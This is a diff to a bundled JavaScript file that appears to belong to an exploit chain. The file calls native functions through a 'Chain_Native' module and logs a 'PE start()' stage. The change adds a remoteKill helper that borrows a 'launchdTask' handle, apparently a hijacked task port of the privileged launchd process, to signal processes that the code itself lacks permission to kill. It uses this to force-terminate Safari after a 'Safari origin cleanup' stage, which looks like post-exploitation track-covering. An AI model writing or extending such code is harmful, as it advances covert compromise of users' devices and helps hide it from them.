@@ -8723,7 +8723,7 @@ function runOptionalStage(label, enabled, fn) {
 	}
 }
 
-function terminateSafariAfterClean() {
+function terminateSafariAfterClean(remoteKillTask) {
 	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
 	const PROC_ALL_PIDS = 1;
 	const SIGTERM = 15;
@@ -8765,6 +8765,31 @@ function terminateSafariAfterClean() {
 		return ep ? Native.read32(BigInt(ep)) : -1;
 	}
 
+	function pidStillExists(pid) {
+		return getProcName(pid).length > 0;
+	}
+
+	function remoteKill(pid, sig, label) {
+		if (!remoteKillTask || !remoteKillTask.success || !remoteKillTask.success()) return { ret: -999, errno: -999 };
+		let ret = remoteKillTask.call(1000, "kill", pid, sig);
+		let errno = 0;
+		if (Number(ret) !== 0) {
+			let ep = remoteKillTask.call(1000, "__error");
+			if (ep) {
+				let errnoBuf = Native.callSymbol("malloc", 4n);
+				if (errnoBuf && errnoBuf !== 0n) {
+					try {
+						if (remoteKillTask.read(BigInt(ep), errnoBuf, 4n)) errno = Native.read32(BigInt(errnoBuf));
+					} finally {
+						Native.callSymbol("free", errnoBuf);
+					}
+				}
+			}
+		}
+		LOG("[SAFARI-CLEAN] safari-kill " + label + " remote pid=" + pid + " sig=" + sig + " ret=" + ret + " errno=" + errno);
+		return { ret: ret, errno: errno };
+	}
+
 	let needed = Number(Native.callSymbol("proc_listpids", PROC_ALL_PIDS, 0, 0n, 0));
 	if (!isFinite(needed) || needed <= 0) needed = 4096;
 	let scanBytes = needed + 4096;
@@ -8778,6 +8803,7 @@ function terminateSafariAfterClean() {
 	let currentPid = Number(Native.callSymbol("getpid"));
 	let matched = 0;
 	let signaled = 0;
+	let terminated = 0;
 	try {
 		let got = Number(Native.callSymbol("proc_listpids", PROC_ALL_PIDS, 0, pidBuf, scanBytes));
 		if (!isFinite(got) || got <= 0) {
@@ -8798,18 +8824,26 @@ function terminateSafariAfterClean() {
 			let ret = Native.callSymbol("kill", pid, SIGTERM);
 			let errno = Number(ret) === 0 ? 0 : nativeErrno();
 			LOG("[SAFARI-CLEAN] safari-kill pid=" + pid + " name=" + name + " ret=" + ret + " errno=" + errno + " path=" + path);
-			if (Number(ret) === 0) {
+			let sent = Number(ret) === 0;
+			if (!sent && errno === 1) {
+				let remoteRet = remoteKill(pid, SIGTERM, "term");
+				sent = Number(remoteRet.ret) === 0;
+			}
+			if (sent) {
 				signaled++;
 				Native.callSymbol("usleep", 250000);
-				if (Number(Native.callSymbol("kill", pid, 0)) === 0) {
+				if (pidStillExists(pid)) {
 					let hardRet = Native.callSymbol("kill", pid, SIGKILL);
 					let hardErrno = Number(hardRet) === 0 ? 0 : nativeErrno();
 					LOG("[SAFARI-CLEAN] safari-kill hard pid=" + pid + " ret=" + hardRet + " errno=" + hardErrno);
+					if (Number(hardRet) !== 0 && hardErrno === 1) remoteKill(pid, SIGKILL, "hard");
+					Native.callSymbol("usleep", 250000);
 				}
+				if (!pidStillExists(pid)) terminated++;
 			}
 		}
-		LOG("[SAFARI-CLEAN] safari-kill done matched=" + matched + " signaled=" + signaled);
-		return signaled > 0 || matched === 0;
+		LOG("[SAFARI-CLEAN] safari-kill done matched=" + matched + " signaled=" + signaled + " terminated=" + terminated);
+		return terminated > 0 || matched === 0;
 	} finally {
 		Native.callSymbol("free", pidBuf);
 	}
@@ -9620,7 +9654,7 @@ function start() { LOG("[+] PE start() called");
 
 	let safariCleanOk = runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
 	if (safariCleanOk && ENABLE_SAFARI_KILL_AFTER_CLEAN) {
-		runOptionalStage("Safari app termination", true, terminateSafariAfterClean);
+		runOptionalStage("Safari app termination", true, () => terminateSafariAfterClean(launchdTask));
 	}
 
 	let agentPid = 0;
